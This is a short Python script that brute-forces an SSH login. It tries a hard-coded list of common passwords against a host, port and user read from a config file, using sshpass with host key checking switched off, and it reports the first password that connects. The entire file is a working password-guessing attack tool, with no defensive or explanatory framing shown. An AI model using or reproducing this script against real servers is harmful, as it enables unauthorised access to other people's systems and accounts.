import subprocess
import time

from config import SSH_HOST, SSH_PORT, SSH_USER


PASSWORDS = [
    "123456",
    "password",
    "admin",
    "root",
    "qwerty",
    "letmein",
    "welcome",
    "123123",
    "password1",
    "test123",
    "hunter2",
    "letter"
]

for password in PASSWORDS:
    print(f"Trying: {password}")

    result = subprocess.run(
        [
            "sshpass",
            "-p", password,
            "ssh",
            "-p", str(SSH_PORT),
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            f"{SSH_USER}@{SSH_HOST}",
            "echo Connected"
        ],
        capture_output=True,
        text=True
    )

    print("Exit code:", result.returncode)

    if result.returncode == 0:
        print(f"[+] Password found: {password}")
        break

    time.sleep(0.3)